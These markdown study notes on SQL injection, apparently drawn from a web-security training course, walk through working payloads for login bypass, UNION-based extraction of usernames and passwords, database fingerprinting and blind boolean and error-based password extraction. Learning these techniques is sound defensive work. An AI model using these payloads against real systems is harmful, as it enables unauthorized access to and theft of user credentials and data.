# SQL injection

1. [SQLi](#sqli)
2. [SQLi Union](#sqli-union)
3. [Examining Database](#examining-database)
4. [Blind SQLi](#blind-sqli)
5. [SQLi CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

* SQLi - web security vulnerability; allows attacker to interfere with queries made by app to database.

* SQLi allows attacker to view data they are not supposed to retrieve; they can modify/delete this data, or escalate it to compromise the server or perform a denial-of-service attack.

## SQLi

* Retrieving hidden data:

  * Suppose the URL for a website is ```https://insecure-website.com/products?category=Gifts```. For this, the SQL query would be like:

    ```sql
    SELECT * FROM products WHERE category = 'Gifts' AND released = 1
    ```

  * The attacker can construct an attack like ```https://insecure-website.com/products?category=Gifts'--```. This gives us the query:

    ```sql
    SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

    -- acts as a comment in the query
    ```

  * The attacker can also use ```https://insecure-website.com/products?category=Gifts'+OR+1=1--```, which gives us the query:

    ```sql
    SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
    ```

* Subverting app logic:

  * For app login, suppose the following SQL query is used:

    ```sql
    SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
    ```

  * The attacker can login without password by using the username ```admin'--``` in order to cut short the query:

    ```sql
    SELECT * FROM users WHERE username = 'admin'--' AND password = ''
    ```

* Retrieving data from other database tables:

  * Suppose the application executes a query based on user input 'Gifts':

    ```sql
    SELECT name, description FROM products WHERE category = 'Gifts'
    ```

  * Then, the attacker can submit the input using ```UNION```:

    ```sql
    ' UNION SELECT username, password FROM users--
    ```

## SQLi Union

* For ```UNION``` queries to work, the two sub-queries must return same number of columns, with compatible data types.

* Finding number of columns required:

  * Method 1 - ```ORDER BY``` clauses are used, incrementing the column index:

    ```sql
    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--
    #until error occurs
    ```
  
  * Method 2 - ```UNION SELECT``` payloads with null values (compatible with all):

    ```sql
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--
    #until error modified
    ```

* Finding columns with useful data type:

  ```sql
  ' UNION SELECT 'a',NULL,NULL--
  ' UNION SELECT NULL,'a',NULL--
  ' UNION SELECT NULL,NULL,'a'--
  #until error does not occur, then relevant column is apt for string data
  ```

* Retrieving interesting data:

  ```sql
  ' UNION SELECT username, password FROM users--
  #provided there is a table 'users' with 2 columns 'username' and 'password'
  ```

* Retrieving multiple values within single column:

  ```sql
  ' UNION SELECT username || '~' || password FROM users--
  #concatenate output in Oracle using pipe operator

  ' UNION SELECT NULL,username || '~' || password FROM users--
  #differs based on number of columns
  ```

## Examining Database

* Querying database type & version:

  ```sql
  ' UNION SELECT @@version--
  #output if Microsoft SQL server

  ' UNION SELECT * FROM v$version
  #output if Oracle

  ' UNION SELECT version()
  #output if PostgreSQL
  ```

* Listing contents of database:

  ```sql
  SELECT * FROM information_schema.tables
  #returns table names

  SELECT * FROM information_schema.columns WHERE table_name = 'Users'
  #shows columns and data types of table
  ```

  ```sql
  #on Oracle
  #list tables
  SELECT * FROM all_tables

  #list columns
  SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
  ```

## Blind SQLi

* In blind vulnerabilities, application does not return results of SQL query or error details; with blind SQLi vulnerabilities, ```UNION attacks``` are not effective.

* Triggering conditional responses:

  * Suppose the app uses tracking cookies to gather usage analytics; requests to app would include a cookie header with 'TrackingId' field, which is used to find if it is a known user:

    ```sql
    SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
    ```

  * This query is vulnerable, but query results are not returned to user; we have to trigger responses conditionally:

    ```sql
    ..dummyVal' AND '1'='1
    #accepts user

    ..dummyVal' AND '1'='2
    #does not accept user
    ```

  * Assume there is a table ```Users``` with columns ```Username``` and ```Password```, with user ```Administrator``` - we can determine password using series of inputs (one char at a time):

    ```sql
    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
    #this accepts user, indicating first char of password is greater than 'm'

    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
    #this does not accept user, indicating first char of password is not greater than 't'

    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
    #accepts user, meaning first char of password is 's'

    #continue this series
    #for Oracle db, use SUBSTR function
    ```

* Triggering SQL errors:

  * Suppose these two requests are sent with 'TrackingId' value:

    ```sql
    xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
    #does not trigger error

    xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
    #triggers error
    ```

  * Technique to retrieve data (one char at a time):

    ```sql
    xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Passord, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
    ```
